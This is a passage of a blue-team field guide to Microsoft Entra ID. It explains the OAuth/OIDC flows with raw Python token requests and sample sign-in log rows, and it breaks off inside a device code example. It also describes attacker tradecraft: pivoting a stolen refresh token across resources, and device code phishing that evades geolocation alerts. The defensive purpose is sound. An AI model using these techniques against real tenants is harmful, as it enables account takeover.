# The Blue-Teamer's Guide to Entra ID

A field guide for defenders of Microsoft Entra ID tenants. The premise: you cannot defend a protocol you don't understand. So this guide builds in two parts.

**Part I — Protocol Foundations** explains every OIDC + OAuth 2.0 flow Entra speaks: how it works, what it looks like on the wire (raw Python, no MSAL), and what log rows it produces. This is the mental model the rest of the guide depends on.

**Part II — Defending the Tenant** is the operational layer: how to read those logs, identify abuse patterns, build detections, run incidents, and harden the environment.

If you already know the protocols, you can jump to Part II at §6. If you only know "Microsoft signs people in somehow," start at §1 and read straight through. Either way, the field references — the per-flow log signatures, the FOCI client list, the KQL library, the runbooks — should be reusable on their own.

Scope: identity-layer attacks against Entra. Not endpoint, not network, not workload runtime. Where those overlap (PRT theft, AiTM, Conditional Access bypasses) we'll touch them, but the core is what's visible in `SigninLogs`, `AADNonInteractiveUserSignInLogs`, `AADServicePrincipalSignInLogs`, and `AuditLogs`.

> **A note on data sources.** Throughout this guide, KQL queries and log field names use the **Sentinel / Log Analytics** schema — i.e., logs exported from Entra ID's *Diagnostic settings* into a Log Analytics workspace. These are the tables most defenders run their hunts and detections against (`SigninLogs`, `AADNonInteractiveUserSignInLogs`, `AADServicePrincipalSignInLogs`, `AuditLogs`, `MicrosoftGraphActivityLogs`, `AADGraphActivityLogs`).
>
> **Microsoft Defender XDR** has a parallel set of advanced-hunting tables — `EntraIdSignInEvents` and `EntraIdSpnSignInEvents` (which replaced the preview-era `AADSignInEventsBeta` and `AADSpnSignInEventsBeta` on 9 December 2025). The data is largely the same — these are Defender XDR's view of the same underlying Entra sign-in stream — but **the column names are different**, and you can't paste a Sentinel query into Defender XDR's hunting console (or vice versa) without translation. Some of the most common mappings to keep in your head:
>
> | Sentinel / Log Analytics | Defender XDR |
> |---|---|
> | `TimeGenerated` | `Timestamp` |
> | `AppId` | `ApplicationId` |
> | `AppDisplayName` | `Application` |
> | `UserId` | `AccountObjectId` |
> | `UserPrincipalName` | `AccountUpn` |
> | `UserDisplayName` | `AccountDisplayName` |
> | `ResultType` | `ErrorCode` |
> | `IsInteractive` (boolean) | `LogonType` (`interactiveUser`/`nonInteractiveUser`) |
> | `Location.countryOrRegion` | `Country` |
> | `CorrelationId` | `ReportId` |
> | `OriginalRequestId` | `RequestId` |
> | `IPAddress`, `SessionId`, `ClientAppUsed` | (same names) |
>
> The detection logic, attack patterns, log-stitching workflows, and investigative principles in this guide all apply equally to the Defender XDR tables — only the field names and table names change. If you're working in `security.microsoft.com`'s advanced hunting rather than Sentinel's Log Analytics, translate as you read. (And note one capability gap: Defender XDR's `EntraIdSignInEvents` requires Entra ID P2; Sentinel ingestion of `SigninLogs` does not.)

---

## Table of contents

**Part I — Protocol Foundations**

1. [Background: OAuth, OIDC, tokens, clients](#1-background-oauth-oidc-tokens-clients)
2. [Authorization Code Flow with PKCE](#2-authorization-code-flow-with-pkce)
3. [Refresh Token Flow](#3-refresh-token-flow)
4. [Client Credentials Flow](#4-client-credentials-flow)
5. [On-Behalf-Of, Device Code, ROPC, Implicit, Hybrid, SAML](#5-on-behalf-of-device-code-ropc-implicit-hybrid-saml)

**Part II — Defending the Tenant**

6. [The log streams and how to read them](#6-the-log-streams-and-how-to-read-them)
7. [Identifying flows from log signals](#7-identifying-flows-from-log-signals)
8. [The Azure Portal sign-in dissected](#8-the-azure-portal-sign-in-dissected)
9. [Continuous Access Evaluation for defenders](#9-continuous-access-evaluation-for-defenders)
10. [First-party client IDs and FOCI abuse](#10-first-party-client-ids-and-foci-abuse)
11. [OAuth phishing and illicit consent grants](#11-oauth-phishing-and-illicit-consent-grants)
12. [Token theft attacks](#12-token-theft-attacks)
13. [Service principal and app credential abuse](#13-service-principal-and-app-credential-abuse)
14. [Detection rule library](#14-detection-rule-library)
15. [Hunt queries](#15-hunt-queries)
16. [Conditional Access as a defender's tool](#16-conditional-access-as-a-defenders-tool)
17. [Incident response runbooks](#17-incident-response-runbooks)
18. [Tenant hardening baseline](#18-tenant-hardening-baseline)
19. [Linkable Token Identifiers](#19-linkable-token-identifiers)
20. [Microsoft Graph activity logs and the legacy AAD Graph](#20-microsoft-graph-activity-logs-and-the-legacy-aad-graph)

---

# Part I — Protocol Foundations

## 1. Background: OAuth, OIDC, tokens, clients

Before the flows make sense, four ideas need to be solid.

**OAuth 2.0 vs OIDC.** OAuth 2.0 is a delegation protocol — it produces *access tokens* that let a client call an API on someone's behalf. OIDC is a thin authentication layer on top — it adds an *ID token* (a signed JWT about who the user is) and a `userinfo` endpoint. In Entra, you get OIDC behavior by including the `openid` scope (and usually `profile`, `email`). Without `openid`, you're doing pure OAuth and you get no ID token.

**The Entra endpoints.** All flows hit the same two endpoints under v2:

- Authorization endpoint: `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize`
- Token endpoint: `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token`

`{tenant}` is your tenant GUID, your verified domain (`contoso.onmicrosoft.com`), `common` (any work or personal account), `organizations` (any work account), or `consumers` (Microsoft personal accounts only).

**Public vs confidential clients.** This distinction drives almost everything:

- **Public client** = can't keep a secret. Desktop app, mobile app, SPA, CLI tool. No `client_secret`. Must use PKCE.
- **Confidential client** = can keep a secret. Server-side web app, daemon, API. Authenticates with `client_secret`, certificate, or federated credential.

**Scopes and resources.** In v2 you pass `scopes` like `User.Read` or `https://graph.microsoft.com/.default`. The special `.default` scope means "give me everything this app is consented to for that resource" — it's what daemon apps use.

**Tokens.**
- *Access token* — JWT (in Entra) sent as `Authorization: Bearer ...` to APIs. Default ~60–90 min lifetime (Microsoft assigns a random value in that range, ~75 min average, to spread re-auth load). With CAE, the lifetime increases to up to **28 hours** but the token is revocable in near-real-time via claims challenges.
- *ID token* — JWT for the *client* to read, never sent to APIs. Tells the app who signed in.
- *Refresh token* — long-lived, used to get fresh access tokens silently. The thing attackers want most.

**The flows you'll see.** There are nine, varying by which endpoint, which client type, and what the client trades in. The next four sections walk through them.

A note on the logs you'll see throughout Part I: each flow produces a specific row shape in Entra sign-in logs. The two most useful fields for flow identification are `IncomingTokenType` (always populated, reliably distinguishes fresh auth vs refresh vs OBO vs primary refresh token) and `AuthenticationProtocol` (populated reliably for *non-OAuth* flows like SAML, device code, ROPC — and typically `"none"` for OAuth-family flows in production). Both appear as top-level columns in the Log Analytics `SigninLogs` table. Part II's detection logic leans on `IncomingTokenType` as the primary signal, with `AuthenticationProtocol` as a positive filter for the non-OAuth flows. See §7 for a calibration note based on real production telemetry.

---

## 2. Authorization Code Flow with PKCE

**The default for almost everything user-facing today.** Browser-based apps, mobile apps, desktop apps, and confidential server-side web apps all use this. PKCE (Proof Key for Code Exchange) replaces the old client-secret-on-the-wire pattern for public clients.

### How it works

1. Client generates a random `code_verifier` (43–128 chars) and derives `code_challenge = BASE64URL(SHA256(code_verifier))`.
2. Client redirects the user's browser to `/authorize` with `response_type=code`, `code_challenge`, `code_challenge_method=S256`, `scope`, `redirect_uri`, `state`, `nonce`.
3. User authenticates with Entra. Entra evaluates Conditional Access, MFA, etc.
4. Entra redirects back to `redirect_uri` with `?code=...&state=...`.
5. Client POSTs to `/token` with the `code`, the original `code_verifier`, and (for confidential clients) `client_secret` or a client assertion JWT. Entra verifies the verifier hashes to the challenge it stored.
6. Entra returns `access_token`, `id_token`, and `refresh_token`.

PKCE protects against an attacker who intercepts the auth code (e.g., via a malicious app on the same OS handling a custom URL scheme) — they can't redeem it without the verifier.

### Pure Python — public client (desktop/CLI)

```python
import base64, hashlib, os, secrets, urllib.parse, webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

CLIENT_ID = "11111111-2222-3333-4444-555555555555"
TENANT    = "your-tenant-id-or-domain"
REDIRECT  = "http://localhost:8400/callback"
SCOPES    = ["User.Read", "Mail.Read", "openid", "profile", "offline_access"]

# PKCE
verifier  = base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=")
challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")
state     = secrets.token_urlsafe(16)
nonce     = secrets.token_urlsafe(16)

# Step 1: build authorize URL and open it
auth_url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/authorize?" + urllib.parse.urlencode({
    "client_id": CLIENT_ID,
    "response_type": "code",
    "redirect_uri": REDIRECT,
    "response_mode": "query",
    "scope": " ".join(SCOPES),
    "state": state,
    "nonce": nonce,
    "code_challenge": challenge,
    "code_challenge_method": "S256",
})
webbrowser.open(auth_url)

# Step 2: catch the redirect on localhost
captured = {}
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        captured.update(dict(urllib.parse.parse_qsl(urllib.parse.urlparse(self.path).query)))
        self.send_response(200); self.end_headers()
        self.wfile.write(b"<h2>You can close this tab.</h2>")
    def log_message(self, *_): pass

with HTTPServer(("localhost", 8400), Handler) as httpd:
    httpd.handle_request()

assert captured["state"] == state, "state mismatch — possible CSRF"

# Step 3: redeem the code
tokens = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
    data={
        "client_id": CLIENT_ID,
        "grant_type": "authorization_code",
        "code": captured["code"],
        "redirect_uri": REDIRECT,
        "code_verifier": verifier,
        "scope": " ".join(SCOPES),
    },
).json()
# tokens has: access_token, id_token, refresh_token, expires_in, scope
```

What's worth absorbing: state, PKCE verifier, and nonce each defend a specific attack. State stops CSRF on the redirect. PKCE stops an attacker from redeeming a stolen code. Nonce (validated inside the ID token) stops ID token replay. Forget any one and you have a real vulnerability.

### Pure Python — confidential client (server-side web app)

The web app does the redirect itself; the only difference at the token endpoint is sending a `client_secret` (or a signed assertion JWT, see §4).

```python
# After Entra redirects back with ?code=... to your callback handler:
tokens = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
    data={
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,        # ← the difference
        "grant_type": "authorization_code",
        "code": code_from_querystring,
        "redirect_uri": "https://app.example.com/auth/callback",
        "code_verifier": stored_pkce_verifier, # still recommended even for confidential clients
        "scope": "openid profile email offline_access User.Read",
    },
).json()
```

### What Entra logs

This is where confidential clients differ from public clients in a way that matters for defenders. Microsoft's documentation explicitly lists "a client uses an OAuth 2.0 authorization code to get an access token and refresh token" as an example of a *non-interactive* event. So a confidential client web app doing auth code + PKCE typically produces **two** related log rows for one user sign-in:

1. **`SigninLogs` (interactive)** — for the user's authentication at `/authorize` (password, MFA, CA evaluation).
2. **`AADNonInteractiveUserSignInLogs` (non-interactive)** — for the confidential client's back-channel `/token` redemption of the auth code.

The two rows share a `correlationId` and represent one logical sign-in. Microsoft also documents a quirk specific to confidential clients: the IP on the non-interactive row "doesn't match the actual source IP of where the refresh token request is coming from. Instead, it shows the original IP used for the original token issuance" — i.e., the user's IP from step 1, not your web server's IP. This trips people up when investigating: you'd reasonably expect the back-channel call's IP to be your data center, but it's not.

For comparison, a *public* client doing the same flow (the §2 desktop/CLI example) tends to consolidate this into a single interactive `SigninLogs` row, because the same process does both the user-facing prompt and the token redemption.

The interactive row from the user's authentication looks like this. (One ceremony can produce several closely-related rows sharing one `correlationId` — one for the prompt, one for MFA, one for token issuance.)

```json
{
  "TenantId": "your-tenant-id",
  "TimeGenerated": "2026-05-08T09:14:22.443Z",
  "Id": "8a4de8b5-095c-47d0-a96f-a75130c61d53",
  "CreatedDateTime": "2026-05-08T09:14:22.443Z",
  "UserDisplayName": "Alice Anderson",
  "UserPrincipalName": "alice@contoso.onmicrosoft.com",
  "UserId": "9f8b7a6c-5d4e-3f2a-1b0c-9d8e7f6a5b4c",
  "AppId": "11111111-2222-3333-4444-555555555555",
  "AppDisplayName": "Contoso Internal Portal",
  "IPAddress": "203.0.113.42",
  "ClientAppUsed": "Browser",
  "CorrelationId": "c1a2b3d4-5e6f-7081-92a3-b4c5d6e7f809",
  "ConditionalAccessStatus": "success",
  "IsInteractive": true,
  "TokenIssuerType": "AzureAD",
  "ResourceDisplayName": "Microsoft Graph",
  "ResourceIdentity": "00000003-0000-0000-c000-000000000000",
  "RiskDetail": "none",
  "RiskLevelAggregated": "none",
  "RiskLevelDuringSignIn": "none",
  "RiskState": "none",
  "RiskEventTypes_V2": [],
  "ResourceTenantId": "your-tenant-id",
  "HomeTenantId": "your-tenant-id",
  "CrossTenantAccessType": "none",
  "AuthenticationRequirement": "multiFactorAuthentication",
  "IncomingTokenType": "none",
  "AuthenticationProtocol": "none",
  "ResultType": "0",
  "ResultSignature": "None",
  "ResultDescription": "MFA requirement satisfied by claim in the token",
  "Status": {
    "errorCode": 0,
    "failureReason": "Other.",
    "additionalDetails": "MFA requirement satisfied by claim in the token"
  },
  "DeviceDetail": {
    "deviceId": "ab12cd34-ef56-7890-abcd-ef0123456789",
    "displayName": "ALICE-LAPTOP",
    "operatingSystem": "Windows 11",
    "browser": "Edge 129.0",
    "isCompliant": true,
    "isManaged": true,
    "trustType": "Azure AD joined"
  },
  "LocationDetails": {
    "city": "Amsterdam",
    "state": "North Holland",
    "countryOrRegion": "NL",
    "geoCoordinates": {"latitude": 52.3676, "longitude": 4.9041}
  },
  "Location": "NL",
  "ConditionalAccessPolicies": [
    {
      "id": "0a1b2c3d-4e5f-6071-8293-a4b5c6d7e8f9",
      "displayName": "Require MFA for all users",
      "enforcedGrantControls": ["Mfa"],
      "enforcedSessionControls": [],
      "result": "success",
      "conditionsSatisfied": 1,
      "conditionsNotSatisfied": 0
    },
    {
      "id": "1b2c3d4e-5f60-7182-93a4-b5c6d7e8f901",
      "displayName": "Block legacy authentication",
      "enforcedGrantControls": ["Block"],
      "result": "notApplied",
      "conditionsSatisfied": 0,
      "conditionsNotSatisfied": 1
    }
  ],
  "AuthenticationDetails": [
    {
      "authenticationStepDateTime": "2026-05-08T09:14:21.901Z",
      "authenticationMethod": "Password",
      "authenticationMethodDetail": "Password in the cloud",
      "succeeded": true,
      "authenticationStepResultDetail": "Correct password",
      "authenticationStepRequirement": "Primary authentication"
    },
    {
      "authenticationStepDateTime": "2026-05-08T09:14:22.115Z",
      "authenticationMethod": "Mobile app notification",
      "authenticationMethodDetail": "Microsoft Authenticator app",
      "succeeded": true,
      "authenticationStepResultDetail": "MFA successfully completed",
      "authenticationStepRequirement": "Multifactor authentication"
    }
  ],
  "AuthenticationProcessingDetails": [
    {"key": "Login Hint Present", "value": "True"},
    {"key": "Is CAE Token", "value": "False"},
    {"key": "Root Site Id", "value": "00000000-0000-0000-0000-000000000000"},
    {"key": "Oauth Scope Info", "value": "[\"User.Read\",\"Mail.Read\",\"openid\",\"profile\",\"offline_access\"]"}
  ],
  "NetworkLocationDetails": [
    {"networkType": "namedNetwork", "networkNames": ["Corp HQ"]}
  ],
  "MfaDetail": {
    "authMethod": "Mobile app notification",
    "authDetail": "Microsoft Authenticator app"
  },
  "TokenProtectionStatusDetails": {
    "signInSessionStatus": "unbound",
    "signInSessionStatusCode": 0
  },
  "SessionLifetimePolicies": [
    {
      "expirationRequirement": "rememberMultifactorAuthenticationOnTrustedDevices",
      "policyId": null
    }
  ]
}
```

The give-aways: `IncomingTokenType: "none"` (nothing was traded in — the user authenticated fresh), `IsInteractive: true`, `ClientAppUsed: "Browser"`, `AuthenticationProtocol: "none"` (which is what OAuth flows actually look like in production — see §7), and the `Oauth Scope Info` entry showing `offline_access` was requested (so a refresh token was issued).

---

## 3. Refresh Token Flow

Not really a "flow" you initiate from scratch — it's how you renew tokens after any **user-delegated** flow (auth code + PKCE, hybrid, ROPC, device code). A single refresh token can mint access tokens for *any resource* the user has consented to. This is what makes RT theft (or OAuth phishing for an RT) so much worse than AT theft.

> **Client credentials does not produce refresh tokens.** This is a frequent misconception — daemon apps using `grant_type=client_credentials` get an access token only, no refresh token. Microsoft's own docs are explicit: "refresh tokens will never be granted with this flow as client_id and client_secret (which would be required to obtain a refresh token) can be used to obtain an access token instead." Structurally it makes sense — refresh tokens exist so you don't have to re-prompt a *user* for credentials. A daemon always has its credential available, so it just calls `/token` again with `grant_type=client_credentials` when its access token expires. This also means the `offline_access` scope has no effect in client-credentials requests, and any code that tries to redeem a "refresh token" issued to a service principal is doing something wrong (almost always: someone confused which flow they used, or copy-pasted user-flow code into a daemon). For defenders: if you see a sign-in row in `AADServicePrincipalSignInLogs` with `IncomingTokenType: "refreshToken"`, that's anomalous and worth investigating — it shouldn't happen for a properly-configured daemon.

### Pure Python

```python
def refresh(refresh_token, scopes, client_secret=None):
    data = {
        "client_id": CLIENT_ID,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": " ".join(scopes),
    }
    if client_secret:
        data["client_secret"] = client_secret
    return requests.post(
        f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
        data=data,
    ).json()

# Same RT, different resources — this is how the Azure Portal works
graph_t = refresh(stored_rt, ["https://graph.microsoft.com/.default"])
arm_t   = refresh(stored_rt, ["https://management.azure.com/.default"])
kv_t    = refresh(stored_rt, ["https://vault.azure.net/.default"])
```

Two important properties for defenders to internalize:

- **You can request different scopes than the original grant** as long as the user already consented to them. This is how the Azure Portal mints ARM tokens, Graph tokens, Key Vault tokens, etc. all from one initial sign-in. It's also how attackers pivot a stolen RT across resources.
- **Refresh tokens rotate** in some scenarios (especially SPAs and high-security configurations). When the response contains a new `refresh_token`, replace the stored one. Using a rotated-out RT is treated as suspicious by Entra and can trigger the whole grant being revoked.

### What Entra logs

Refresh redemptions show up in `AADNonInteractiveUserSignInLogs`. The `correlationId` from the original interactive sign-in is *not* preserved — each refresh has its own.

```json
{
  "TenantId": "your-tenant-id",
  "TimeGenerated": "2026-05-08T10:18:55.221Z",
  "Id": "fb38ec24-9b6f-4a5e-bd11-3e2a9c7d4e51",
  "CreatedDateTime": "2026-05-08T10:18:55.221Z",
  "UserDisplayName": "Alice Anderson",
  "UserPrincipalName": "alice@contoso.onmicrosoft.com",
  "UserId": "9f8b7a6c-5d4e-3f2a-1b0c-9d8e7f6a5b4c",
  "AppId": "11111111-2222-3333-4444-555555555555",
  "AppDisplayName": "Contoso Internal Portal",
  "IPAddress": "203.0.113.42",
  "ClientAppUsed": "Mobile Apps and Desktop clients",
  "CorrelationId": "9d8e7f6a-5b4c-3d2e-1f09-8a7b6c5d4e3f",
  "ConditionalAccessStatus": "success",
  "IsInteractive": false,
  "TokenIssuerType": "AzureAD",
  "ResourceDisplayName": "Microsoft Graph",
  "ResourceIdentity": "00000003-0000-0000-c000-000000000000",
  "RiskState": "none",
  "RiskDetail": "none",
  "RiskLevelAggregated": "none",
  "AuthenticationRequirement": "singleFactorAuthentication",
  "IncomingTokenType": "primaryRefreshToken",
  "AuthenticationProtocol": "none",
  "ResultType": "0",
  "ResultSignature": "None",
  "Status": {
    "errorCode": 0,
    "failureReason": "Other."
  },
  "DeviceDetail": {
    "deviceId": "ab12cd34-ef56-7890-abcd-ef0123456789",
    "displayName": "ALICE-LAPTOP",
    "operatingSystem": "Windows 11",
    "isCompliant": true,
    "isManaged": true,
    "trustType": "Azure AD joined"
  },
  "ConditionalAccessPolicies": [
    {
      "id": "0a1b2c3d-4e5f-6071-8293-a4b5c6d7e8f9",
      "displayName": "Require MFA for all users",
      "enforcedGrantControls": ["Mfa"],
      "result": "success",
      "conditionsSatisfied": 1,
      "conditionsNotSatisfied": 0
    }
  ],
  "AuthenticationDetails": [
    {
      "authenticationStepDateTime": "2026-05-08T10:18:55.180Z",
      "authenticationMethod": "Previously satisfied",
      "authenticationMethodDetail": "MFA requirement satisfied by claim in the token",
      "succeeded": true,
      "authenticationStepResultDetail": "MFA requirement satisfied by claim in the token",
      "authenticationStepRequirement": "Primary authentication"
    }
  ],
  "AuthenticationProcessingDetails": [
    {"key": "Is CAE Token", "value": "True"},
    {"key": "Oauth Scope Info", "value": "[\"User.Read\",\"openid\",\"profile\",\"offline_access\"]"}
  ]
}
```

Tells: `IncomingTokenType: "primaryRefreshToken"` (or `"refreshToken"` for non-PRT scenarios), `IsInteractive: false`, `AuthenticationMethod: "Previously satisfied"`, and the row lives in `AADNonInteractiveUserSignInLogs`.

---

## 4. Client Credentials Flow

App authenticates **as itself**, no user. Confidential client only. The app must hold a credential — secret, certificate, or federated credential. Always use `.default` scope.

### Pure Python — secret

```python
tokens = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
    data={
        "client_id": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
        "client_secret": "the-secret",
        "grant_type": "client_credentials",
        "scope": "https://graph.microsoft.com/.default",
    },
).json()
# No refresh_token, no id_token — there's no user.
```

### Pure Python — certificate (preferred for production)

Build a short-lived JWT (a "client assertion") signed with the app's private key. Entra verifies it against the public cert you uploaded. Secrets in env vars and CI logs leak; private keys in HSMs / Key Vault don't.

```python
import time, uuid, base64
import jwt as pyjwt
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization

with open("/secrets/app.key", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)
with open("/secrets/app.crt", "rb") as f:
    cert = x509.load_pem_x509_certificate(f.read())

# Entra requires the cert thumbprint (SHA-1) base64url-encoded as `x5t` in the JWT header.
x5t = base64.urlsafe_b64encode(cert.fingerprint(hashes.SHA1())).decode().rstrip("=")

now = int(time.time())
assertion = pyjwt.encode(
    {
        "aud": f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
        "iss": CLIENT_ID,
        "sub": CLIENT_ID,
        "jti": str(uuid.uuid4()),
        "nbf": now,
        "exp": now + 600,    # 10 min — Entra's max accepted lifetime
        "iat": now,
    },
    private_key,
    algorithm="RS256",
    headers={"x5t": x5t, "alg": "RS256", "typ": "JWT"},
)

tokens = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
    data={
        "client_id": CLIENT_ID,
        "grant_type": "client_credentials",
        "scope": "https://graph.microsoft.com/.default",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": assertion,
    },
).json()
```

The same `client_assertion` pattern works for confidential client auth-code redemption (replace `client_secret` in §2 with the assertion). **Federated credentials** (workload identity federation — GitHub Actions, AKS pods, AWS, GCP) are also this pattern, except the assertion is signed by an *external* IdP instead of your own private key. From Entra's perspective the request shape is identical.

### What Entra logs

Service principal sign-ins land in `AADServicePrincipalSignInLogs`, **not** `SignInLogs`. There's no user, no MFA, no Conditional Access (well, workload identity CA can apply with P2). The `servicePrincipalCredentialKeyId` field tells you *which* credential was used — invaluable for credential rotation and forensics.

```json
{
  "TenantId": "your-tenant-id",
  "TimeGenerated": "2026-05-08T11:00:13.708Z",
  "Id": "5d4e3f2a-1b0c-9d8e-7f6a-5b4c3d2e1f09",
  "CreatedDateTime": "2026-05-08T11:00:13.708Z",
  "AppId": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
  "ServicePrincipalId": "77665544-3322-1100-ffee-ddccbbaa9988",
  "ServicePrincipalName": "Contoso Nightly Sync Daemon",
  "IPAddress": "198.51.100.21",
  "ResultType": "0",
  "ResultSignature": "SUCCESS",
  "ResultDescription": "",
  "CorrelationId": "deadbeef-1234-5678-9abc-def012345678",
  "ConditionalAccessStatus": "notApplied",
  "TokenIssuerType": "AzureAD",
  "ResourceDisplayName": "Microsoft Graph",
  "ResourceIdentity": "00000003-0000-0000-c000-000000000000",
  "ResourceTenantId": "your-tenant-id",
  "HomeTenantId": "your-tenant-id",
  "IncomingTokenType": "none",
  "AuthenticationProtocol": "none",
  "UniqueTokenIdentifier": "Yk1nQ2VVdEpV...",
  "ServicePrincipalCredentialKeyId": "11112222-3333-4444-5555-666677778888",
  "ServicePrincipalCredentialThumbprint": "A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2",
  "ConditionalAccessPolicies": [],
  "AuthenticationProcessingDetails": [
    {"key": "Authentication credential used", "value": "Certificate"},
    {"key": "Oauth Scope Info", "value": "[\".default\"]"},
    {"key": "Is CAE Token", "value": "False"}
  ]
}
```

Tells: lives in `AADServicePrincipalSignInLogs`, no `UserPrincipalName`, `Authentication credential used` shows `Certificate` or `ClientSecret` or `FederatedIdentityCredential`. If you see `ClientSecret` for an app you intended to make passwordless, that's an audit finding — and the basis for one of Part II's most useful detection rules.

---

## 5. On-Behalf-Of, Device Code, ROPC, Implicit, Hybrid, SAML

The remaining flows, grouped because each is shorter than the first three.

### On-Behalf-Of (OBO)

A middle-tier API received a token for the user; it needs to call a downstream API *as that user*. It exchanges the inbound token for a new one targeting the downstream resource. Confidential client. This is the canonical pattern for "API A calls API B on behalf of the user" — and the protocol layer behind every Azure Portal IAM blade view.

```python
graph_for_user = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
    data={
        "client_id": MIDDLE_TIER_CLIENT_ID,
        "client_secret": MIDDLE_TIER_SECRET,
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": inbound_user_access_token,    # the AT this API received
        "scope": "https://graph.microsoft.com/User.Read",
        "requested_token_use": "on_behalf_of",
    },
).json()
```

The two distinguishing parameters: `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer` and `requested_token_use=on_behalf_of`. A correctness gotcha: the inbound token's audience must be the middle tier's app ID URI. If the client called your API with a token meant for some other resource, OBO fails.

**What Entra logs:**

```json
{
  "TenantId": "your-tenant-id",
  "TimeGenerated": "2026-05-08T11:42:09.115Z",
  "Id": "4c3b2a19-8e7d-6c5b-4a3a-2b1c0d9e8f7a",
  "CreatedDateTime": "2026-05-08T11:42:09.115Z",
  "UserDisplayName": "Alice Anderson",
  "UserPrincipalName": "alice@contoso.onmicrosoft.com",
  "UserId": "9f8b7a6c-5d4e-3f2a-1b0c-9d8e7f6a5b4c",
  "AppId": "middle-tier-app-id",
  "AppDisplayName": "Contoso Orders API",
  "IPAddress": "10.20.30.40",
  "ClientAppUsed": "Mobile Apps and Desktop clients",
  "CorrelationId": "112233aa-bbcc-ddee-ff00-112233445566",
  "ConditionalAccessStatus": "success",
  "IsInteractive": false,
  "TokenIssuerType": "AzureAD",
  "ResourceDisplayName": "Microsoft Graph",
  "ResourceIdentity": "00000003-0000-0000-c000-000000000000",
  "IncomingTokenType": "jwt",
  "AuthenticationProtocol": "none",
  "AuthenticationRequirement": "singleFactorAuthentication",
  "ResultType": "0",
  "ResultSignature": "None",
  "Status": {
    "errorCode": 0,
    "failureReason": "Other."
  },
  "ConditionalAccessPolicies": [
    {
      "id": "0a1b2c3d-4e5f-6071-8293-a4b5c6d7e8f9",
      "displayName": "Require MFA for all users",
      "enforcedGrantControls": ["Mfa"],
      "result": "success",
      "conditionsSatisfied": 1,
      "conditionsNotSatisfied": 0
    }
  ],
  "AuthenticationDetails": [
    {
      "authenticationStepDateTime": "2026-05-08T11:42:09.090Z",
      "authenticationMethod": "Previously satisfied",
      "authenticationMethodDetail": "MFA requirement satisfied by claim in the token",
      "succeeded": true,
      "authenticationStepResultDetail": "MFA requirement satisfied by claim in the token",
      "authenticationStepRequirement": "Primary authentication"
    }
  ],
  "AuthenticationProcessingDetails": [
    {"key": "Authentication credential used", "value": "ClientSecret"},
    {"key": "Oauth Scope Info", "value": "[\"User.Read\"]"},
    {"key": "Is CAE Token", "value": "False"}
  ]
}
```

Tells: user identity present, but `IncomingTokenType: "jwt"` (a token was traded in, not a code), and `AppId` is the *middle tier*, not the original front-end client. The IP is the middle tier's internal IP — not the user's. Defenders trying to geolocate the user from this row will be misled; pivot back to the originating sign-in to find the real IP.

### Device Code

For devices that don't have a browser. User authenticates on a separate device with a short code. Public client only. **Heavy phishing target.**

```python
# Step 1: initiate
flow = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
    data={"client_id": CLIENT_ID, "scope": "User.Read offline_access"},
).json()

print(flow["message"])  # "Go to https://microsoft.com/devicelogin and enter G7H3K9P2"

# Step 2: poll until user completes (or attacker's victim does)
while True:
    poll = requests.post(
        f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
        data={
            "client_id": CLIENT_ID,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": flow["device_code"],
        },
    )
    if poll.status_code == 200:
        tokens = poll.json()
        break
    if poll.json().get("error") == "authorization_pending":
        time.sleep(flow["interval"])
        continue
    raise RuntimeError(poll.json())
```

⚠️ Device code phishing is a top vector against Entra. The IP that appears in the resulting `SigninLogs` row is the *user's* IP (where they completed the prompt), not the *attacker's* IP (where polling happens). This is why "sign-in from new country" detections miss device code phishing entirely. The signature to alert on is `AuthenticationProtocol == "deviceCode"` itself — see Part II §11.

```json
{
  "TenantId": "your-tenant-id",
  "TimeGenerated": "2026-05-08T12:05:44.331Z",
  "Id": "7a6b5c4d-3e2f-1098-7654-3210fedcba98",
  "CreatedDateTime": "2026-05-08T12:05:44.331Z",
  "UserDisplayName": "Bob Bennett",
  "UserPrincipalName": "bob@contoso.onmicrosoft.com",
  "UserId": "8c7b6a59-4e3d-2c1b-0a98-765432109876",
  "AppId": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
  "AppDisplayName": "Microsoft Azure CLI",
  "IPAddress": "203.0.113.99",
  "ClientAppUsed": "Mobile Apps and Desktop clients",
  "CorrelationId": "abcdef01-2345-6789-abcd-ef0123456789",
  "ConditionalAccessStatus": "success",
  "IsInteractive": true,
  "TokenIssuerType": "AzureAD",
  "ResourceDisplayName": "Microsoft Graph",
  "ResourceIdentity": "00000003-0000-0000-c000-000000000000",
  "IncomingTokenType": "none",
  "AuthenticationProtocol": "deviceCode",
  "AuthenticationRequirement": "multiFactorAuthentication",
  "ResultType": "0",
  "ResultSignature": "None",
  "Status": {"errorCode": 0, "failureReason": "Other."},
  "DeviceDetail": {
    "browser": "Chrome 129.0",
    "operatingSystem": "MacOs",
    "trustType": ""
  },
